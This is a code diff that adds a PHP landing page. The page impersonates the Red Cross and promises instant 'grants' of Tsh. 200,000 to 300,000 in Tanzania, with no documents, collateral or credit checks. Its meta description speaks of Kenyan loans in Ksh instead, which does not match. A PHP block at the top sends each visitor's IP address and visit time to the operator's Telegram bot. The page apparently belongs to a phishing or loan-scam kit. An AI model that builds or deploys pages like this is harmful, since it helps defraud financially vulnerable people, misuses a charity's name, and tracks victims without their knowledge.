@@ -1,0 +1,164 @@
+<?php
+// === TELEGRAM NOTIFICATION SCRIPT ===
+$botToken = 'YOUR_BOT_TOKEN'; // <-- Replace with your bot token
+$chatId = 'YOUR_CHAT_ID';     // <-- Replace with your chat ID
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$time = date("Y-m-d H:i:s");
+
+$message = "📲 Homepage Visited\nIP: $ip\nTime: $time";
+
+file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
+?>
+
+    <!DOCTYPE html>
+    <html lang="en">
+
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="description" content="Get instant mobile loans from Ksh. 3,000 to Ksh. 50,000 processed in under 5 minutes. No collateral or paperwork needed." />
+        <title>Instant Mobile Grands</title>
+
+        <!-- Bootstrap CSS -->
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+        <!-- Bootstrap Icons -->
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+
+        <style>
+            body {
+                background: linear-gradient(to bottom right, #eaf0f9, #f5f9ff);
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            }
+            
+            .loan-card {
+                background: #ffffff;
+                border-radius: 20px;
+                padding: 30px 25px;
+                max-width: 420px;
+                margin: 60px auto;
+                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+                text-align: center;
+            }
+            
+            .loan-icon {
+                background-color: #2563eb;
+                width: 60px;
+                height: 60px;
+                border-radius: 12px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin: 0 auto 20px;
+            }
+            
+            .loan-icon img {
+                width: 36px;
+                height: 36px;
+                object-fit: contain;
+            }
+            
+            .loan-card h1 {
+                font-size: 1.7rem;
+                font-weight: 700;
+                color: #1e3a8a;
+                margin-bottom: 10px;
+            }
+            
+            .loan-card p {
+                font-size: 1rem;
+                margin-bottom: 10px;
+            }
+            
+            .loan-card p span {
+                color: #2563eb;
+                font-weight: 600;
+            }
+            
+            .feature-list {
+                text-align: left;
+                margin-top: 20px;
+            }
+            
+            .feature-item {
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                margin: 10px 0;
+            }
+            
+            .feature-item i {
+                background: #2563eb;
+                color: #fff;
+                border-radius: 50%;
+                padding: 6px;
+                font-size: 0.8rem;
+            }
+            
+            .apply-btn {
+                background-color: #2563eb;
+                color: white;
+                font-weight: 600;
+                border-radius: 12px;
+                padding: 12px;
+                font-size: 1rem;
+                width: 100%;
+                margin-top: 25px;
+                border: none;
+                transition: background-color 0.3s ease;
+                text-decoration: none;
+                display: inline-block;
+            }
+            
+            .apply-btn:hover {
+                background-color: #1d4ed8;
+            }
+            
+            .footer-text {
+                font-size: 0.9rem;
+                color: #6b7280;
+                margin-top: 15px;
+            }
+        </style>
+    </head>
+
+    <body>
+
+        <main class="loan-card" role="region" aria-label="Loan Information Card">
+            <div class="loan-icon">
+                <img src="redcross_logo-removebg-preview (1).png" alt="Loan Logo">
+            </div>
+
+            <h1>RED CROSS GRANDS DRIVE</h1>
+            <p>Access funds from <span>Tsh. 200,000</span> to <span>Tsh. 300,000</span></p>
+            <p>processed within <span>5 minutes</span>.</p>
+
+            <div class="feature-list">
+                <div class="feature-item">
+                    <i class="bi bi-check-lg"></i>
+                    <span>No credit bureau check required</span>
+                </div>
+                <div class="feature-item">
+                    <i class="bi bi-check-lg"></i>
+                    <span>No documentation required</span>
+                </div>
+                <div class="feature-item">
+                    <i class="bi bi-check-lg"></i>
+                    <span>No collateral needed</span>
+                </div>
+                <div class="feature-item">
+                    <i class="bi bi-check-lg"></i>
+                    <span>No guarantors required</span>
+                </div>
+            </div>
+
+            <a href="details.html" class="apply-btn" role="button" aria-label="Apply for Loan">Apply for grand</a>
+            <p class="footer-text">Serving over 100,000 satisfied people in Tanzania</p>
+        </main>
+
+        <!-- Bootstrap JS Bundle -->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+    </body>
+
+    </html>
